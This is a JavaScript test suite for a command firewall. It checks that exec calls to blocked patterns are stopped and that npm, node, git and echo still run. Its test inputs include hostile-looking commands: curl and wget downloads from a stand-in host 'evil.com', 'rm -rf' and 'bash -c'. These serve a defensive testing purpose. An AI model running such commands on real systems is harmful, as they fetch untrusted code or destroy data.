/**
 * Blocked Patterns Runtime Tests
 * Tests that all blockedPatterns actually block commands
 */

const { runFirewallTest } = require('./test-runner');

console.log('======================================================');
console.log('   Blocked Command Patterns Tests (E2E Pattern)');
console.log('======================================================\n');

let passed = 0;
let failed = 0;

async function runCommandTest(name, code, expectBlocked = true) {
  const result = await runFirewallTest(
    name,
    code,
    (output) => {
      const wasBlocked = output.includes('BLOCKED') || output.includes('blocked');
      const wasAllowed = output.includes('ALLOWED');
      
      if (expectBlocked) {
        return {
          pass: wasBlocked,
          reason: wasBlocked ? 'blocked' : 'not blocked'
        };
      } else {
        return {
          pass: wasAllowed,
          reason: wasAllowed ? 'allowed' : 'blocked'
        };
      }
    }
  );
  
  if (result) passed++; else failed++;
  return result;
}

async function runTests() {
  console.log('[1] Testing Blocked Command Patterns\n');

  // Test 1: curl with -o flag (high severity)
  await runCommandTest(
    'Block: curl -o /tmp/file https://evil.com',
    `const { exec } = require('child_process');
     exec('curl -o /tmp/file https://evil.com', (err) => {
       console.log(err ? 'BLOCKED' : 'NOT_BLOCKED');
     });
     setTimeout(() => {}, 200);`,
    true
  );

  // Test 2: curl with --output flag
  await runCommandTest(
    'Block: curl --output /tmp/file https://evil.com',
    `const { exec } = require('child_process');
     exec('curl --output /tmp/file https://evil.com', (err) => {
       console.log(err ? 'BLOCKED' : 'NOT_BLOCKED');
     });
     setTimeout(() => {}, 200);`,
    true
  );

  // Test 3: wget (high severity)
  await runCommandTest(
    'Block: wget https://evil.com',
    `const { exec } = require('child_process');
     exec('wget https://evil.com', (err) => {
       console.log(err ? 'BLOCKED' : 'NOT_BLOCKED');
     });
     setTimeout(() => {}, 200);`,
    true
  );

  // Test 4: rm -rf (high severity)
  await runCommandTest(
    'Block: rm -rf /tmp/test',
    `const { exec } = require('child_process');
     exec('rm -rf /tmp/test', (err) => {
       console.log(err ? 'BLOCKED' : 'NOT_BLOCKED');
     });
     setTimeout(() => {}, 200);`,
    true
  );

  // Test 5: bash -c (medium severity)
  await runCommandTest(
    'Block: bash -c "echo test"',
    `const { exec } = require('child_process');
     exec('bash -c "echo test"', (err) => {
       console.log(err ? 'BLOCKED' : 'NOT_BLOCKED');
     });
     setTimeout(() => {}, 200);`,
    true
  );

  console.log('\n[2] Testing Allowed Commands\n');

  // Test 6: npm (should be allowed)
  await runCommandTest(
    'Allow: npm --version',
    `const { exec } = require('child_process');
     exec('npm --version', (err, stdout) => {
       console.log(!err && stdout ? 'ALLOWED' : 'BLOCKED');
     });
     setTimeout(() => {}, 200);`,
    false
  );

  // Test 7: node (should be allowed)
  await runCommandTest(
    'Allow: node --version',
    `const { exec } = require('child_process');
     exec('node --version', (err, stdout) => {
       console.log(!err && stdout ? 'ALLOWED' : 'BLOCKED');
     });
     setTimeout(() => {}, 200);`,
    false
  );

  // Test 8: git (should be allowed if installed)
  await runCommandTest(
    'Allow: git --version',
    `const { exec } = require('child_process');
     exec('git --version', (err, stdout) => {
       console.log(!err && stdout ? 'ALLOWED' : 'BLOCKED');
     });
     setTimeout(() => {}, 200);`,
    false
  );

  // Test 9: echo (safe command)
  await runCommandTest(
    'Allow: echo "safe command"',
    `const { exec } = require('child_process');
     exec('echo "safe command"', (err, stdout) => {
       console.log(!err && stdout ? 'ALLOWED' : 'BLOCKED');
     });
     setTimeout(() => {}, 200);`,
    false
  );

  console.log('\n======================================================');
  console.log('Summary:');
  console.log(`  Passed: ${passed}`);
  console.log(`  Failed: ${failed}`);
  console.log('======================================================\n');

  if (failed === 0) {
    console.log('All blocked pattern tests passed! ✓\n');
    process.exit(0);
  } else {
    console.log(`${failed} test(s) failed.\n`);
    process.exit(1);
  }
}

runTests().catch(err => {
  console.error('Test suite error:', err);
  process.exit(1);
});
